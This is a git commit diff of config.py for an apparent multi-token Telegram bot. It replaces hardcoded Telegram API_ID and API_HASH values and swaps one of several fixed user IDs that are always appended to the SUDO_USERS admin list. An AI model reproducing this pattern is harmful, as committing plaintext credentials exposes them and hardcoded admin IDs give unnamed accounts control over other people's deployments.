9f98574be72f63ae72b2b7a9e094b2484bbd9a20
Itzsahare <164456688+Itzsahare@users.noreply.github.com>
2024-04-02 12:26:22 +0530

    Update config.py

--- config.py
+++ config.py
@@ -10,8 +10,8 @@ logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s'
 
 
 #values
-API_ID = 18136872
-API_HASH = "312d861b78efcd1b02183b2ab52a83a4"
+API_ID = 23438595
+API_HASH = "a4116de2115f0a4c4822e5a831861d41"
 CMD_HNDLR = getenv("CMD_HNDLR", default=".")
 HEROKU_APP_NAME = config("HEROKU_APP_NAME", None)
 HEROKU_API_KEY = config("HEROKU_API_KEY", None)
@@ -26,7 +26,7 @@ BOT_TOKEN8 = config("BOT_TOKEN8", default=None)
 BOT_TOKEN9 = config("BOT_TOKEN9", default=None)
 BOT_TOKEN10 = config("BOT_TOKEN10", default=None)
 SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
-SUDO_USERS.append(6919199044)
+SUDO_USERS.append(7084293397)
 SUDO_USERS.append(6762113050)
 SUDO_USERS.append(6876910746)
 
